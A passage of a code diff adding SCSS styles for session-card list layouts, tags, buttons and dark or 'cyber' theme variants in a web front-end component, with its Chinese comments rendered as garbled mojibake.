++
++  .session-card__shell {
++    flex: 1;
++    min-width: 0;
++    display: flex;
++    flex-direction: column;
++    gap: 12px;
++    padding: 12px 14px 12px 10px;
++  }
++
++  .theme-dark & .session-card__shell,
++  .theme-cyber & .session-card__shell {
++    padding: 14px 16px 14px 12px;
++    gap: 14px;
++  }
++
++  /*
++   * 澶撮儴鎺掑竷锛氱旱鍚戜袱甯︼紙涓婏細韬唤/鍩熷悕 鈫?涓嬶細鎿嶄綔锛夛紝绂佹宸﹀彸鍙屾爮鎶㈠瀵艰嚧婧㈠嚭鍙犲湪鎸夐挳涓?+   * 鐗瑰紓鎬у帇杩?.compact-card .top-section 鍐呰仈鐨?flex 鍙屾爮涓?.top-left-info 鐨?max-width:70%
++   */
++  .compact-card.session-card .top-section {
++    display: flex !important;
++    flex-direction: column !important;
++    align-items: stretch !important;
++    justify-content: flex-start !important;
++    gap: 12px;
++    margin-bottom: 0 !important;
++    width: 100%;
++    min-width: 0;
++  }
++
++  .compact-card.session-card .top-section .top-left-info {
++    max-width: 100% !important;
++    width: 100% !important;
++    min-width: 0 !important;
++    padding-left: 0 !important;
++    gap: 8px 10px !important;
++    box-sizing: border-box;
++  }
++
++  .theme-dark & .compact-card.session-card .top-section .top-left-info,
++  .theme-cyber & .compact-card.session-card .top-section .top-left-info {
++    display: flex !important;
++    flex-wrap: wrap !important;
++    align-items: center !important;
++    grid-template-columns: unset !important;
++    row-gap: 8px !important;
++    column-gap: 10px !important;
++  }
++
++  .compact-card.session-card .top-section .top-right-actions {
++    display: flex !important;
++    flex-shrink: 0;
++    align-self: stretch;
++    width: 100%;
++    max-width: 100%;
++    min-width: 0;
++    box-sizing: border-box;
++    flex-wrap: wrap;
++    justify-content: flex-end;
++    align-items: center;
++    gap: 8px 10px;
++    padding: 10px 12px;
++    border-radius: 12px;
++    background: rgba(248, 250, 252, 0.92);
++    border: 1px solid rgba(148, 163, 184, 0.22);
++    box-shadow: 0 1px 2px rgba(15, 23, 42, 0.04);
++    backdrop-filter: blur(10px);
++  }
++
++  .theme-dark & .compact-card.session-card .top-section .top-right-actions,
++  .theme-cyber & .compact-card.session-card .top-section .top-right-actions {
++    background: rgba(255, 255, 255, 0.04);
++    border-color: rgba(255, 255, 255, 0.1);
++    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04);
++  }
++
++  .compact-card.session-card .top-section .top-right-actions .main-actions {
++    display: flex;
++    flex-wrap: wrap;
++    justify-content: flex-end;
++    gap: 8px;
++    min-width: 0;
++  }
++
++  .compact-card.session-card .top-section .top-right-actions .icon-actions {
++    display: flex;
++    flex-wrap: wrap;
++    justify-content: flex-end;
++    gap: 8px;
++    margin-top: 0;
++  }
++
++  .compact-card.session-card .top-left-info .domain-text {
++    min-width: 0;
++    max-width: 100%;
++    overflow-wrap: anywhere;
++    word-break: break-word;
++  }
++
++  .session-card .id-box {
++    margin-left: 0 !important;
++    border-radius: 11px;
++    font-size: 13px;
++    padding: 5px 12px;
++    box-shadow: 0 1px 2px rgba(15, 23, 42, 0.05);
++  }
++
++  .session-card .time-text {
++    border-radius: 11px;
++    font-size: 12px;
++    padding: 5px 11px;
++  }
++
++  .session-card .domain-text {
++    border-radius: 11px;
++    font-size: 12px;
++    max-width: 100%;
++    padding: 6px 11px;
++    min-width: 0;
++    flex: 1 1 auto;
++    overflow-wrap: anywhere;
++    word-break: break-word;
++  }
++
++  .session-card__pill-grid.card-info-row {
++    display: grid;
++    grid-template-columns: repeat(auto-fill, minmax(152px, 1fr));
++    gap: 8px 10px;
++    margin-bottom: 0;
++    align-items: stretch;
++  }
++
++  .session-card__pill-grid .card-type-tag {
++    margin-left: 0 !important;
++    border-radius: 10px;
++    padding: 6px 12px;
++    font-weight: 600;
++  }
++
++  .session-card__pill-grid .pill.business-pill,
++  .session-card__pill-grid .pill.remark-pill {
++    padding: 8px 10px;
++    border-radius: 11px;
++    font-size: 12px;
++    line-height: 1.35;
++    min-height: 38px;
++    box-sizing: border-box;
++    align-items: flex-start;
++    border: 1px solid rgba(148, 163, 184, 0.28);
++    box-shadow: 0 1px 0 rgba(255, 255, 255, 0.45) inset;
++  }
++
++  .theme-dark & .session-card__pill-grid .pill.business-pill,
++  .theme-cyber & .session-card__pill-grid .pill.business-pill,
++  .theme-dark & .session-card__pill-grid .pill.remark-pill,
++  .theme-cyber & .session-card__pill-grid .pill.remark-pill {
++    border-color: rgba(255, 255, 255, 0.1);
++    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04);
++  }
++
++  .session-card__main .bottom-status-rows {
++    margin-top: 2px;
++    padding: 10px 12px;
++    border-radius: 14px;
++    background: rgba(241, 245, 249, 0.88);
++    border: 1px solid rgba(148, 163, 184, 0.22);
++    flex-wrap: wrap;
++    white-space: normal;
++    min-height: auto;
++    row-gap: 8px;
++  }
++
++  .theme-dark & .session-card__main .bottom-status-rows,
++  .theme-cyber & .session-card__main .bottom-status-rows {
++    background: rgba(0, 0, 0, 0.22);
++    border-color: rgba(255, 255, 255, 0.08);
++  }
++
++  .session-card__main .bottom-status-row .current-status-tag {
++    border-radius: 8px;
++    padding: 4px 10px;
++    font-size: 12px;
++    font-weight: 600;
++    background: rgba(16, 185, 129, 0.1);
++    color: #047857;
++    min-width: auto;
++  }
++
++  .theme-dark & .session-card__main .bottom-status-row .current-status-tag,
++  .theme-cyber & .session-card__main .bottom-status-row .current-status-tag {
++    background: rgba(52, 211, 153, 0.12);
++    color: rgba(167, 243, 208, 0.95);
++  }
++
++  .session-card__main .bottom-status-row .status-divider {
++    height: 20px;
++    background: linear-gradient(180deg, transparent, rgba(148, 163, 184, 0.45), transparent);
++  }
++
++  .session-card__main .path-chain {
++    flex: 1;
++    min-width: 0;
++    flex-wrap: wrap;
++    white-space: normal;
++    row-gap: 4px;
++    padding: 6px 4px;
++    border-radius: 10px;
++    background: rgba(255, 255, 255, 0.55);
++  }
++
++  .theme-dark & .session-card__main .path-chain,
++  .theme-cyber & .session-card__main .path-chain {
++    background: rgba(255, 255, 255, 0.03);
++  }
++
++  /* 鈥斺€?鍒楄〃寮忎細璇濊锛氬叏瀹藉垎闅?+ 妯悜涓昏锛堝榻愬弬鑰冩帶鍒跺彴锛?鈥斺€?*/
++  .session-card--list.compact-card.session-card {
++    border-radius: 0 !important;
++    margin-bottom: 0 !important;
++    padding: 0 !important;
++    box-shadow: none !important;
++    border: none !important;
++    border-bottom: 1px solid rgba(148, 163, 184, 0.38) !important;
++    background: var(--card-bg) !important;
++    overflow: visible;
++  }
++
++  .theme-dark & .session-card--list.compact-card.session-card,
++  .theme-cyber & .session-card--list.compact-card.session-card {
++    border-bottom-color: rgba(255, 255, 255, 0.09) !important;
++    background: rgba(24, 26, 40, 0.72) !important;
++  }
++
++  .session-card--list.online-card.session-card {
++    border-bottom-color: rgba(14, 165, 233, 0.22) !important;
++    box-shadow: none !important;
++  }
++
++  /* 鍙傝€冨浘锛氱函鐧芥暣琛岋紝鏃犲乏渚ц壊杞?*/
++  .session-card--list .session-card__rail {
++    display: none;
++  }
++
++  .session-card--list .session-card__shell,
++  .session-card--list .session-list-shell {
++    padding: 0 !important;
++    gap: 0 !important;
++  }
++
++  .session-list-primary {
++    display: flex;
++    flex-direction: row;
++    align-items: flex-start;
++    gap: 16px;
++    padding: 10px 16px 12px;
++    min-height: 76px;
++    box-sizing: border-box;
++    flex-wrap: nowrap;
++  }
++
++  .theme-dark & .session-list-primary,
++  .theme-cyber & .session-list-primary {
++    padding: 10px 16px 12px 12px;
++  }
++
++  .list-col--meta {
++    flex: 0 0 auto;
++    min-width: 84px;
++    display: flex;
++    flex-direction: column;
++    gap: 4px;
++    padding-top: 2px;
++  }
++
++  .meta-line.meta-id {
++    font-size: 15px;
++    font-weight: 800;
++    color: #1e293b;
++    letter-spacing: 0;
++  }
++
++  .theme-dark & .meta-line.meta-id,
++  .theme-cyber & .meta-line.meta-id {
++    color: rgba(248, 250, 252, 0.95);
++  }
++
++  .meta-line.meta-time {
++    font-size: 12px;
++    color: #94a3b8;
++    font-weight: 500;
++  }
++
++  .theme-dark & .meta-line.meta-time,
++  .theme-cyber & .meta-line.meta-time {
++    color: rgba(148, 163, 184, 0.9);
++  }
++
++  .list-col--center {
++    flex: 1 1 auto;
++    min-width: 0;
++    display: flex;
++    flex-direction: column;
++    gap: 6px;
++  }
++
++  .list-center-row--tags {
++    display: flex;
++    flex-direction: row;
++    flex-wrap: wrap;
++    align-items: center;
++    gap: 6px;
++    row-gap: 4px;
++  }
++
++  .session-card--list .list-mh-card-tag.card-type-tag {
++    margin-left: 0 !important;
++    margin-right: 0 !important;
++    padding: 3px 10px !important;
++    font-size: 11px !important;
++    line-height: 1.3 !important;
++    border-radius: 4px !important;
++  }
++
++  .theme-light & .session-card--list .list-mh-card-tag.card-type-tag.empty-card {
++    background: #ffffff !important;
++    border: 1px solid #94a3b8 !important;
++    color: #64748b !important;
++    box-shadow: none !important;
++  }
++
++  .theme-dark & .session-card--list .list-mh-card-tag.card-type-tag.empty-card,
++  .theme-cyber & .session-card--list .list-mh-card-tag.card-type-tag.empty-card {
++    background: rgba(15, 23, 42, 0.35) !important;
++    border: 1px solid rgba(148, 163, 184, 0.35) !important;
++    color: rgba(226, 232, 240, 0.75) !important;
++    box-shadow: none !important;
++  }
++
++  .tag-outline {
++    display: inline-flex;
++    align-items: center;
++    justify-content: center;
++    padding: 2px 8px;
++    font-size: 11px;
++    font-weight: 800;
++    border-radius: 3px;
++    line-height: 1.2;
++    background: #ffffff;
++    letter-spacing: 0.02em;
++  }
++
++  .tag-outline--green {
++    border: 1px solid #22c55e;
++    color: #166534;
++  }
++
++  .tag-outline--gray {
++    border: 1px solid #94a3b8;
++    color: #475569;
++  }
++
++  .session-card--list .list-mh-remark,
++  .session-card--list .list-mh-level {
++    padding: 3px 8px !important;
++    font-size: 11px !important;
++    min-height: auto !important;
++    border-radius: 6px !important;
++  }
++
++  .session-card--list .list-mh-pill {
++    padding: 4px 9px !important;
++    font-size: 11px !important;
++    min-height: auto !important;
++    border-radius: 6px !important;
++  }
++
++  /* 閲嶇偣鍗″彿锛氬疄蹇冪豢搴曠櫧瀛楋紙瀵归綈鍙傝€冨浘锛?*/
++  .session-card--list .highlight-card-pill {
++    background: #22c55e !important;
++    border-color: #16a34a !important;
++    color: #ffffff !important;
++    box-shadow: none !important;
++  }
++
++  .session-card--list .highlight-card-pill .p-key,
++  .session-card--list .highlight-card-pill .p-val {
++    color: #ffffff !important;
++  }
++
++  .list-center-row--pink {
++    display: flex;
++    flex-direction: row;
++    flex-wrap: wrap;
++    gap: 6px;
++    align-items: center;
++  }
++
++  .pill-pink-verify {
++    display: inline-flex !important;
++    align-items: center;
++    padding: 3px 10px !important;
++    font-size: 12px !important;
++    line-height: 1.35 !important;
++    border-radius: 6px !important;
++    background: #fce7f3 !important;
++    border: 1px solid #fbcfe8 !important;
++    color: #be185d !important;
++    margin: 0 !important;
++    min-height: auto !important;
++    cursor: pointer;
++  }
++
++  .pill-pink-verify .p-key,
++  .pill-pink-verify .p-val {
++    color: #be185d !important;
++    font-weight: 600;
++  }
++
++  .list-center-row--path {
++    display: flex;
++    flex-wrap: wrap;
++    align-items: baseline;
++    gap: 4px 8px;
++    font-size: 12px;
++    line-height: 1.5;
++    /* 璺緞瀛楀潡鐣ヤ笅绉伙細涓婄暀鐧藉姞澶с€佷笅鐣欑櫧鏀剁揣锛堜笌涓婃柟 pill 浠嶇敱 .list-col--center 鐨?gap 鎺у埗锛?*/
++    margin-top: 4px;
++    padding-top: 10px;
++    padding-bottom: 0;
++    margin-bottom: -4px;
++  }
++
++  .path-flow-prefix {
++    color: #7c3aed;
++    font-weight: 700;
++    flex-shrink: 0;
++  }
++
++  .theme-dark & .path-flow-prefix,
++  .theme-cyber & .path-flow-prefix {
++    color: #c4b5fd;
++  }
++
++  .path-flow-body {
++    color: #64748b;
++    word-break: break-word;
++    font-weight: 500;
++  }
++
++  .theme-dark & .path-flow-body,
++  .theme-cyber & .path-flow-body {
++    color: rgba(203, 213, 225, 0.88);
++  }
++
++  .path-flow-more {
++    color: #64748b;
++    cursor: pointer;
++    font-weight: 700;
++    user-select: none;
++  }
++
++  .list-col--actions {
++    flex: 0 0 auto;
++    display: flex;
++    flex-direction: row;
++    align-items: center;
++    gap: 10px;
++    flex-wrap: nowrap;
++    padding-top: 2px;
++  }
++
++  .list-col--actions .main-actions {
++    display: flex;
++    flex-wrap: nowrap;
++    gap: 8px;
++    align-items: center;
++  }
++
++  .list-row-icon-actions {
++    display: flex;
++    gap: 6px;
++    align-items: center;
++    flex-shrink: 0;
++  }
++
++  .list-icon-square {
++    width: 30px;
++    height: 30px;
++    padding: 0;
++    display: inline-flex;
++    align-items: center;
++    justify-content: center;
++    border: 1px solid #cbd5e1;
++    border-radius: 4px;
++    background: #ffffff;
++    color: #64748b;
++    cursor: pointer;
++    transition: background 0.15s ease, border-color 0.15s ease, color 0.15s ease;
++    line-height: 1;
++  }
++
++  .list-icon-square:hover {
++    border-color: #94a3b8;
++    color: #334155;
++    background: #f8fafc;
++  }
++
++  .theme-dark & .list-icon-square,
++  .theme-cyber & .list-icon-square {
++    background: rgba(30, 32, 46, 0.95);
++    border-color: rgba(255, 255, 255, 0.14);
++    color: rgba(226, 232, 240, 0.88);
++  }
++
++  .theme-dark & .list-icon-square:hover,
++  .theme-cyber & .list-icon-square:hover {
++    background: rgba(255, 255, 255, 0.08);
++  }
++
++  .list-btn-jump.el-button {
++    background: linear-gradient(180deg, #22c55e 0%, #16a34a 100%) !important;
++    border: none !important;
++    color: #fff !important;
++    padding: 7px 12px !important;
++    border-radius: 8px !important;
++    font-weight: 600 !important;
++  }
++
++  .list-btn-jump.el-button:hover,
++  .list-btn-jump.el-button:focus {
++    color: #fff !important;
++    opacity: 0.92;
++  }
++
++  .list-btn-reject.el-button {
++    background: linear-gradient(180deg, #a78bfa 0%, #7c3aed 100%) !important;
++    border: none !important;
++    color: #fff !important;
++    padding: 7px 12px !important;
++    border-radius: 8px !important;
++    font-weight: 600 !important;
++  }
++
++  .list-btn-reject.el-button:hover,
++  .list-btn-reject.el-button:focus {
++    color: #fff !important;
++    opacity: 0.92;
++  }
++
+   // 绂荤嚎鍗＄墖鏍峰紡
+   .offline-card {
+     opacity: 0.7;
+@@ -2642,13 +3479,32 @@ export default {
+     transform: none !important;
+   }
+ 
+-  // 鍦ㄧ嚎鍗＄墖娣诲姞缁胯壊杈规
++  // 鍦ㄧ嚎鍗＄墖锛氭柊璁捐涓嬬敤杞诲井澶栧彂鍏夋浛浠ｃ€岀矖缁挎銆?   .online-card {
+     border: 1px solid var(--card-border) !important;
+     box-shadow: none !important;
+     background: var(--card-bg) !important;
+   }
+ 
++  .online-card.session-card {
++    border-color: rgba(14, 165, 233, 0.28) !important;
++    box-shadow:
++      0 0 0 1px rgba(14, 165, 233, 0.08),
++      0 12px 40px -20px rgba(14, 165, 233, 0.25) !important;
++  }
++
++  .theme-dark & .online-card.session-card,
++  .theme-cyber & .online-card.session-card {
++    border-color: rgba(129, 140, 248, 0.35) !important;
++    box-shadow:
++      0 0 0 1px rgba(129, 140, 248, 0.12),
++      0 16px 48px -24px rgba(99, 102, 241, 0.35) !important;
++  }
++
++  .offline-card.session-card {
++    filter: saturate(0.92);
++  }
++
+   // 绂荤嚎鏃堕暱鏍峰紡
+   .offline-time {
+     font-size: 10px;
